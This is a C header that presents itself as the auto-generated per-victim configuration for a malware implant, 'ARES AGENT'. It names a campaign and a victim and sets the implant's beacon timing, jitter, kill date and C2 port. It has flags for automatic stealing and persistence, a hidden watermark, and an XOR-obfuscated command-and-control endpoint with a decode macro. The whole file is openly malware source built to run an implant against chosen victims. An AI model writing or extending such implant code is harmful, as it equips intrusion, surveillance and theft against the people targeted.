/*
 *  ARES AGENT -- Per-Victim Configuration (AUTO-GENERATED)
 *
 *  Campaign:  OP_GHOST
 *  Target:    VICTIM_02
 *  Target ID: b785de1270ca319d
 *  Generated: 2026-05-22 11:18:02
 *  XOR Key:   0x9A
 *
 *  DO NOT EDIT -- regenerate with builder_v4.py
 */

#ifndef ARES_CONFIG_H
#define ARES_CONFIG_H

#include <windows.h>

#define CFG_CAMPAIGN_ID       "af5f06674b41c6eb"
#define CFG_TARGET_ID         "b785de1270ca319d"
#define CFG_XOR_KEY           0x9A

#define CFG_SLEEP_MS          10344
#define CFG_JITTER_PCT        32
#define CFG_KILL_DATE_TS      0

#define CFG_C2_PORT           8443
#define CFG_C2_COUNT          1
#define CFG_UA_INDEX          3

/* Per-victim watermark (hidden in padding) */
static const BYTE CFG_WATERMARK[16] = {0x58, 0x01, 0x0B, 0xD5, 0x6F, 0xD9, 0x22, 0x73, 0xCE, 0x6E, 0xFE, 0x71, 0x8F, 0x42, 0x95, 0xF8};

/* Feature flags */
#define CFG_AUTO_STEAL        0
#define CFG_AUTO_PERSIST      0

static const BYTE CFG_C2_0[] = {0xF9, 0xA8, 0xB4, 0xFF, 0xE2, 0xFB, 0xF7, 0xEA, 0xF6, 0xFF, 0xB4, 0xF9, 0xF5, 0xF7};
#define CFG_C2_0_LEN 14

#define ARES_DECODE_CONFIG(s) do { \
    _xd((s)->config.c2_endpoints[0], CFG_C2_0, CFG_C2_0_LEN, CFG_XOR_KEY); \
    (s)->config.c2_count = CFG_C2_COUNT; \
} while(0)

#endif /* ARES_CONFIG_H */
